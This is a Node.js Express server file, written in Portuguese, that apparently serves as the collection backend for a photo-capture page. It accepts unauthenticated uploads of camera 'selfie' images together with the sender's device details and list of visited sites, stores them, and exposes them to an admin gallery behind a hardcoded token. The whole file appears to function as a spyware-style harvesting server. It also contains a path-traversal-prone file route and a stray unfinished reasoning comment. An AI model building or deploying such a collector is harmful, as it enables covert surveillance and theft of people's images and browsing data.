const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// TOKEN SECRETO - MUDE ISSO!
const TOKEN_SECRETO = 'meusegredo123';

// Middleware de autenticação
const autenticar = (req, res, next) => {
    const token = req.query.token || req.headers['authorization'];
    
    if (token === TOKEN_SECRETO) {
        next();
    } else {
        res.status(401).json({ sucesso: false, mensagem: 'Acesso negado' });
    }
};

// Middleware
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Rota raiz - servir index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Rota admin
app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Rota galeria
app.get('/galeria.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'galeria.html'));
});

// Criar pasta de fotos se não existir (usar /tmp em produção)
const photosDir = process.env.VERCEL ? '/tmp/photos' : path.join(__dirname, 'photos');
if (!fs.existsSync(photosDir)) {
    fs.mkdirSync(photosDir, { recursive: true });
}

// Rota para salvar foto
app.post('/salvar-foto', (req, res) => {
    try {
        const { foto, dispositivo, sitesVisitados, timestamp } = req.body;

        if (!foto) {
            return res.status(400).json({ sucesso: false, mensagem: 'Foto não recebida' });
        }

        // Remover o prefixo data:image/jpeg;base64,
        const base64Data = foto.replace(/^data:image\/jpeg;base64,/, '');

        // Gerar nome do arquivo com timestamp único para ambos
        const ts = Date.now();
        const nomeArquivo = `salfie_${ts}.jpg`;
        const caminhoArquivo = path.join(photosDir, nomeArquivo);
        const nomeMetadados = `salfie_${ts}.json`;
        const caminhoMetadados = path.join(photosDir, nomeMetadados);

        // Salvar arquivo de imagem
        fs.writeFileSync(caminhoArquivo, base64Data, 'base64');

        // Salvar metadados em JSON
        const metadados = {
            arquivo: nomeArquivo,
            timestamp: timestamp || new Date().toISOString(),
            dispositivo: dispositivo || {},
            sitesVisitados: sitesVisitados || []
        };
        fs.writeFileSync(caminhoMetadados, JSON.stringify(metadados, null, 2));

        res.json({ 
            sucesso: true, 
            mensagem: 'Foto salva com sucesso!',
            arquivo: nomeArquivo
        });
    } catch (erro) {
        console.error('Erro ao salvar foto:', erro);
        res.status(500).json({ 
            sucesso: false, 
            mensagem: 'Erro ao salvar foto: ' + erro.message 
        });
    }
});

// Rota para listar fotos
app.get('/fotos', autenticar, (req, res) => {
    try {
        const files = fs.readdirSync(photosDir);
        const fotosJpg = files.filter(f => f.endsWith('.jpg'));
        
        const fotosComMetadados = fotosJpg.map(foto => {
            const nomeBase = foto.replace(/\.jpg$/, '');
            const caminhoBase = path.join(photosDir, nomeBase);
            
            // Tenta encontrar o arquivo JSON correspondente
            // Nota: O server salva com salfie_timestamp.json, mas às vezes o timestamp pode variar um milisegundo?
            // Não, o server gera os nomes assim:
            // const nomeArquivo = `salfie_${Date.now()}.jpg`;
            // const nomeMetadados = `salfie_${Date.now()}.json`;
            // Espera, Date.now() pode mudar entre as duas chamadas!
            
            // Deixe-me verificar o código do server.js que salva a foto.
            
            let metadados = null;
            const caminhoMetadados = path.join(photosDir, nomeBase + '.json');
            
            if (fs.existsSync(caminhoMetadados)) {
                try {
                    metadados = JSON.parse(fs.readFileSync(caminhoMetadados, 'utf8'));
                } catch (e) {
                    console.error('Erro ao ler metadados:', e);
                }
            }
            
            return {
                arquivo: foto,
                metadados: metadados
            };
        });

        // Ordenar por mais recentes primeiro (baseado no timestamp do arquivo ou nome)
        fotosComMetadados.sort((a, b) => b.arquivo.localeCompare(a.arquivo));

        res.json({ sucesso: true, fotos: fotosComMetadados });
    } catch (erro) {
        console.error('Erro ao listar fotos:', erro);
        res.status(500).json({ sucesso: false, mensagem: 'Erro ao listar fotos' });
    }
});

// Rota para servir fotos
// Rota para servir fotos
app.get('/fotos/:nome', autenticar, (req, res) => {
    const caminhoArquivo = path.join(photosDir, req.params.nome);
    
    if (fs.existsSync(caminhoArquivo)) {
        res.sendFile(caminhoArquivo);
    } else {
        res.status(404).json({ sucesso: false, mensagem: 'Foto não encontrada' });
    }
});

// Rota para obter metadados de uma foto
app.get('/fotos/:nome/metadata', autenticar, (req, res) => {
    try {
        const nomeJpg = req.params.nome.replace(/\.jpg$/, '');
        const caminhoMetadados = path.join(photosDir, nomeJpg + '.json');
        
        if (fs.existsSync(caminhoMetadados)) {
            const metadados = fs.readFileSync(caminhoMetadados, 'utf8');
            res.json(JSON.parse(metadados));
        } else {
            res.status(404).json({ sucesso: false, mensagem: 'Metadados não encontrados' });
        }
    } catch (erro) {
        res.status(500).json({ sucesso: false, mensagem: 'Erro ao carregar metadados' });
    }
});

const PORT = 8080;
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
    console.log(`📂 Fotos serão salvas em: ${photosDir}`);
});
